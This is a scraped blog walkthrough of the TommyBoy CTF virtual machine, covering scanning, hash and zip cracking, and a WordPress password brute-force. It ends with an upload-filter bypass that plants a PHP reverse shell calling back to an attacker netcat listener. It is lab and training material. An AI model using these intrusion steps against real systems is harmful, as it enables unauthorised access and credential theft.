@@ -1,0 +1,872 @@
+
+								
+																		Hack the TommyBoy VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 12, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Tommy Boy VM is a CTF based on the movie Tommy Boy and the fictitious company “Callahan Auto” in the movie. This CTF, Tommy Boy, has been created by Brian Johnson of 7 Minute Security. It is a really fun VM — a few bits of it were fairly easy, some parts of it were really tricky, and there are some pretty neat little tricks in there too.
+Note from the author:
+The primary objective is to restore a backup copy of the homepage to Callahan Auto’s server. However, to consider the box fully pwned, you’ll need to collect 5 flags strewn about the system and use the data inside them to unlock one final message.
+WalkThrough
+Let’s start off with scanning the network to find our target.
+
+We found our target –&gt; 192.168.1.108
+Our next step is to scan our target with NMAP. We will apply an aggressive scan as it is quick.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.108
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.108
+					
+				
+			
+		
+
+
+The result shows us that there are 3 ports opened: 22(ssh), 80(http), 8008(http).
+To further explore and find rest of the flags we browsed URL on port 80 and we greeted with the Callahan Auto page which apparently was experiencing some technical difficulties.
+
+Let’s use Nikto tool to have detailed information about our target. So for this, type the following  :
+
+		
+		
+			
+			
+			
+			
+nikto -h http://192.168.1.108/
+			
+				
+					
+				
+					1
+				
+						nikto -h http://192.168.1.108/
+					
+				
+			
+		
+
+
+By using the Nikto command we found out that there is a text file with the name of robots.txt which might contain some useful information. Either we can open it in our browser or can list the contents via the curl command as shown below. And yes, we found our first flag.
+
+		
+		
+			
+			
+			
+			
+curl http://192.168.1.108/robots.txt
+			
+				
+					
+				
+					1
+				
+						curl http://192.168.1.108/robots.txt
+					
+				
+			
+		
+
+
+Hurrah!!  We got our first flag     B34rcl4ws
+I took a look at the main page again, to see if there’s anything of interest in the View Source. I found a Youtube link.
+I then executed the CURL command which would also give the same results (as view-source) and happen to found a Youtube link. There seems to be no harm in opening it, so let us do that and see if it has some significant information.
+
+Upon opening the Youtube link, we can predict that it has something to do with prehistoric forest. So we decided to use it on the browser as –&gt; 192.168.1.108/prehistoricforext/
+
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/prehistoricforest
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/prehistoricforest
+					
+				
+			
+		
+
+And to our luck, we found a lot of information. First of our information was that the website was made in WordPress
+
+
+As we found another important clue on the same web page of the prehistoric forest we decided to investigate further. And this decision proved right as we found another clue which stated to use /richard instead of /prehistoricforest
+Let’s browse with http://192.168.1.108/richard/
+
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/richard/shockedrichard.jpg
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/richard/shockedrichard.jpg
+					
+				
+			
+		
+
+
+This image, being as it is, gave us no clue. So we decided to open it with EXIF tool.
+
+Go to www.md5cracker.org  OR http://www.hashkiller.co.uk/ site and crack the md5 code we just discovered. On cracking it we will find that it makes up the word spanky
+
+The output of cracked MD5 hash :
+
+		
+		
+			
+			
+			
+			
+ce154b5a8e59c89732bc25d6a2e6b90b   spanky
+			
+				
+					
+				
+					1
+				
+						ce154b5a8e59c89732bc25d6a2e6b90b   spanky
+					
+				
+			
+		
+
+Further investigating the same “prehistoricforest” page we found other important things like the text file which contained our second flag.
+
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/prehistoricforest/thisisthesecondflagyayyou.txt
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/prehistoricforest/thisisthesecondflagyayyou.txt
+					
+				
+			
+		
+
+
+Hurrah!!  We got our 2nd Flag –   Z4l1nsky
+If we furthermore navigate to the URL http://192.168.1.108/prehistoricforest  and go to a password protected blog, then it will prompt for a password. Let’s try and input the password as spanky. Hey, we are in !!
+
+We are able to read the blog now, which contains loads of information with the hidden hints. Go through the full-page and note down the things to remember :
+Upon going through the page, we noted down 2 things (refer below screenshot), which could be a way going forward. We will utilize these clues one by one.
+1. There is something about nickburns
+
+ There is an FTP service running and hosted on a Non-standard port. Also, the FTP server goes up and down with a regular frequency of 15 mins 
+
+
+Now let’s try to find if the FTP port is open as per the clue provided in the blog. We scanned for the ports before and did not find an FTP port anywhere. So let us scan port by port.
+Note: The FTP server was running on a non-standard port and goes on/off every 15 minutes.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -sV 192.168.1.108 --open
+			
+				
+					
+				
+					1
+				
+						nmap -p- -sV 192.168.1.108 --open
+					
+				
+			
+		
+
+
+We took a guess that he may re-use his username as his password and tried as nickburns: nickburns and it was successful!
+
+		
+		
+			
+			
+			
+			
+ftp 192.168.1.108 65534
+			
+				
+					
+				
+					1
+				
+						ftp 192.168.1.108 65534
+					
+				
+			
+		
+
+Upon taking a look at the readme file, we were presented with some additional clues.
+
+		
+		
+			
+			
+			
+			
+cat readme.txt
+			
+				
+					
+				
+					1
+				
+						cat readme.txt
+					
+				
+			
+		
+
+
+In the file, you will see that he is talking about a subfolder “NickizL33t“. I tried this subdirectory on port 80 but got no success, therefore I tried again on port 8008.
+First, let’s try to access http://192.168.1.108:8008/ and see what is in store for us.
+
+Now if we pay attention and notice it says “only me and Steve Jobs are allowed to look at this stuff” that means we can read the content with iPhone. There is Add-on for Mozilla browser named “User Agent Switcher” which will allow us to read the said file.
+When you have added this Add-on. Go to the Tools menu. A drop-down menu will appear select Default User Agent and from its select iPhone 3.0 option.
+
+ 
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108:8008/NickIzL33t/
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108:8008/NickIzL33t/
+					
+				
+			
+		
+
+
+Now as he is talking about certain .html file. As we have already checked everywhere and didn’t find such a file. It’s a possibility that this file was hidden so let’s use DIRBuster or dirb to find it.
+Note: Running the below command will take a lot of memory and hence it is recommended to upgrade/increase the RAM of your system sufficient enough to run this command.
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.108:8008/NickIzL33t/ /usr/share/wordlists/rockyou.txt -a "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25" -X .html
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.108:8008/NickIzL33t/ /usr/share/wordlists/rockyou.txt -a "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25" -X .html
+					
+				
+			
+		
+
+Finally. After a long wait, we got the html file – fallon1.html
+Upon browsing the URL  http://192.168.1.108:8008/NickIzL33t/fallon1.html and as we can see we got a lot of information
+
+
+Hurrah!!  We got our 3rd Flag –     TinyHead
+Additionally, download the zip file t0msp4ssw0rdz.zip
+
+ 
+Also, let’s click on A hint and we will get redirected to http://192.168.1.108:8008/NickIzL33t/hint.txt  where we will find hints about the passwords.
+
+We need to figure out how to create a custom dictionary utilizing the above clues which Nick has given us.It starts with ‘bev’,1 upper case char, 2 numbers, 2 lowercase chars, one symbol and then 1995
+bev[A-Z][1–9][1–9][a-z][a-z][symbol]1995
+Let’s use crunch utility to create a dictionary with the following command:
+
+		
+		
+			
+			
+			
+			
+crunch 13 13 -t bev,%%@@^1995 -o /root/Desktop/dict.txt
+			
+				
+					
+				
+					1
+				
+						crunch 13 13 -t bev,%%@@^1995 -o /root/Desktop/dict.txt
+					
+				
+			
+		
+
+
+Now we have got our custom dictionary from the clues. Let’s use it to brute force Big Tom’s password file with the help of a fcrackzip tool.
+
+		
+		
+			
+			
+			
+			
+cd Downloads/
+fcrackzip -u -D -p /root/Desktop/dict.txt t0msp4ssw0rdz.zip
+Password = bevH00tr$1995
+			
+				
+					
+				
+					123
+				
+						cd Downloads/fcrackzip -u -D -p /root/Desktop/dict.txt t0msp4ssw0rdz.zipPassword = bevH00tr$1995
+					
+				
+			
+		
+
+Unzip the file using the password extracted in the above step :
+
+		
+		
+			
+			
+			
+			
+unzip t0msp4ssw0rdz.zip
+			
+				
+					
+				
+					1
+				
+						unzip t0msp4ssw0rdz.zip
+					
+				
+			
+		
+
+Here we will get a file passwords.txt, upon reading the same we will get the output with some usernames and credentials.
+
+		
+		
+			
+			
+			
+			
+cat passwords.txt
+			
+				
+					
+				
+					1
+				
+						cat passwords.txt
+					
+				
+			
+		
+
+
+Here we need to identify the full password of Callahan Auto Server as it is clearly mentioned that after the “fatguyinalittlecoat“ part there are some numbers; however, the admin doesn’t remember that.
+Username: bigtommysenior
+Password: fatguyinalittlecoat  &lt;partial password&gt;
+Let’s perform a WordPress Scan and enumerate the users
+
+		
+		
+			
+			
+			
+			
+wpscan -u http://192.168.1.108/prehistoricforest/ --enumerate u
+			
+				
+					
+				
+					1
+				
+						wpscan -u http://192.168.1.108/prehistoricforest/ --enumerate u
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+wpscan -u http://192.168.1.108/prehistoricforest/ --wordlist=/usr/share/wordlists/rockyou.txt --username tom
+			
+				
+					
+				
+					1
+				
+						wpscan -u http://192.168.1.108/prehistoricforest/ --wordlist=/usr/share/wordlists/rockyou.txt --username tom
+					
+				
+			
+		
+
+Password for user ‘tom’ is ‘tomtom1’
+I tried finding the credentials for user tommy and it went for quite long, finally, I abandoned it.
+
+Now let’s log in to the WordPress site http://192.168.1.108/prehistoricforest/wp-admin as user ‘tom’ with the above credentials. Once logged in, we will find a post in the “drafts” folder of the dashboard – my-ess-ess-eight-password
+We also got a clue (from my-ess-ess-eight-password – read it as SSH password ) that there is something on SSH port that we may need to look upon going forward !!
+
+ 
+So now, we will try to log in with SSH port with the user bigtommysenior with the following credentials:
+
+		
+		
+			
+			
+			
+			
+Username: bigtommysenior
+Password: fatguyinalittlecoat1938!!
+ssh bigtommysenior@192.168.1.108
+			
+				
+					
+				
+					123
+				
+						Username: bigtommyseniorPassword: fatguyinalittlecoat1938!!ssh bigtommysenior@192.168.1.108
+					
+				
+			
+		
+
+To see the list of files and folders type :
+
+		
+		
+			
+			
+			
+			
+ls -la
+			
+				
+					
+				
+					1
+				
+						ls -la
+					
+				
+			
+		
+
+Here we will see a file el-flag-numero-quatro.txt which could be of our interest. Let’s open the same
+
+		
+		
+			
+			
+			
+			
+cat el-flag-numero-quatro.txt
+			
+				
+					
+				
+					1
+				
+						cat el-flag-numero-quatro.txt
+					
+				
+			
+		
+
+The contents of the file contain the flag data!
+
+Hurrah!!  We got our 4th Flag –   EditButton
+In addition, we got a clue for the 5th flag as well (i.e a name of the file /5.txt)
+1.Restoration of the website
+Before we go to the last flag, we need to restore the backup first. As seen from the above screenshot there is a callahanbak.bak file, which seems to be a backup file. Let’s copy this file to the /var/www/html directory as follows :
+
+		
+		
+			
+			
+			
+			
+cp callahanbak.bak /var/www/html/index.html
+			
+				
+					
+				
+					1
+				
+						cp callahanbak.bak /var/www/html/index.html
+					
+				
+			
+		
+
+
+Now try browsing the company website. http://192.168.1.108/index.html. As a result of restoring the backup, we can see that now the website has been restored back to normal.
+
+
+ Capture the last flag
+
+Upon exploring more and doing view-source for http://192.168.1.108:8008/NickIzL33t/fallon1.html, we found a clue for a particular folder P4TCH_4D4MS. Let’s append this as a sub-directory to URL http://192.168.1.108:8008/NickIzL33t/
+
+ 
+Browse the URL http://192.168.1.108:8008/NickIzL33t/P4TCH_4D4MS/  It gives an option to upload an image file. This is a clue that we can upload our reverse shell here
+
+We already have an existing php-reverse-shell.php file under the path usr/share/webshells/php of Kali Linux. Let’s edit the php-reverse-shell.php file and modify with Kali IP as follows ($ip = ‘192.168.1.107’)
+
+While trying to upload the php file (with PHP extension), we were unable to upload this file and greeted with an error saying only image (JPEG, PNG, GIF) files are allowed.
+This means that there is a file extension restriction/filter in place. Let’s try to rename the file extension to .png and see if it works. Yes, upon uploading again we observed that the file php-reverse-shell.png has been uploaded successfully.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108:8008/NickIzL33t/P4TCH_4D4MS/upload.php
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108:8008/NickIzL33t/P4TCH_4D4MS/upload.php
+					
+				
+			
+		
+
+
+We now need to go the uploads folders and change the extension back to its original self (i.e change from .png back to .php). Before that, we need to find out where exactly is the uploads folder?
+Upon navigation and more research we found that the following path contains the uploads folder, which has the php-reverse-shell.png file uploaded by us earlier.
+
+		
+		
+			
+			
+			
+			
+cd /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/
+ls
+			
+				
+					
+				
+					12
+				
+						cd /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/ls
+					
+				
+			
+		
+
+Here we can see the uploads directory which might contain some interesting files
+
+		
+		
+			
+			
+			
+			
+cd uploads/
+ls
+			
+				
+					
+				
+					12
+				
+						cd uploads/ls
+					
+				
+			
+		
+
+From the output, we can see the file php-reverse-shell.png (uploaded in the earlier step), listed under the uploads directory
+Now move/replace the file php-reverse-shell.png with the php-reverse-shell.php as shown below
+
+		
+		
+			
+			
+			
+			
+mv php-reverse-shell.png php-reverse-shell.php
+			
+				
+					
+				
+					1
+				
+						mv php-reverse-shell.png php-reverse-shell.php
+					
+				
+			
+		
+
+
+Let’s run the Netcat listener
+
+		
+		
+			
+			
+			
+			
+nc –lvp 1234
+			
+				
+					
+				
+					1
+				
+						nc –lvp 1234
+					
+				
+			
+		
+
+Browse the following URL and we will get the limited shell access
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108:8008/NickIzL33t/P4TCH_4D4MS/uploads/php-reverse-shell.php
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108:8008/NickIzL33t/P4TCH_4D4MS/uploads/php-reverse-shell.php
+					
+				
+			
+		
+
+Now let’s read the content and we will see that .5.txt file is listed here :
+
+		
+		
+			
+			
+			
+			
+ls -la
+cat .5.txt
+			
+				
+					
+				
+					12
+				
+						ls -lacat .5.txt
+					
+				
+			
+		
+
+
+Voila!!  We got our 5th Flag –     Buttcrack
+As we have captured all five flags, let’s concatenate all the flags together which is a long string and may eventually help us to open the zip file
+
+		
+		
+			
+			
+			
+			
+String : B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
+			
+				
+					
+				
+					1
+				
+						String : B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
+					
+				
+			
+		
+
+So, now unzip the zip file:
+
+		
+		
+			
+			
+			
+			
+unzip LOOT.zip
+			
+				
+					
+				
+					1
+				
+						unzip LOOT.zip
+					
+				
+			
+		
+
+It will prompt for unzip password and we will type the lengthy string (as mentioned above ) as the password. Once the file is unzipped it will contain the last part of the challenge i.e. a text file. Let’s read it and finish this whole thing up :
+
+		
+		
+			
+			
+			
+			
+cat THE-END.txt
+			
+				
+					
+				
+					1
+				
+						cat THE-END.txt
+					
+				
+			
+		
+
+
+Author: Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
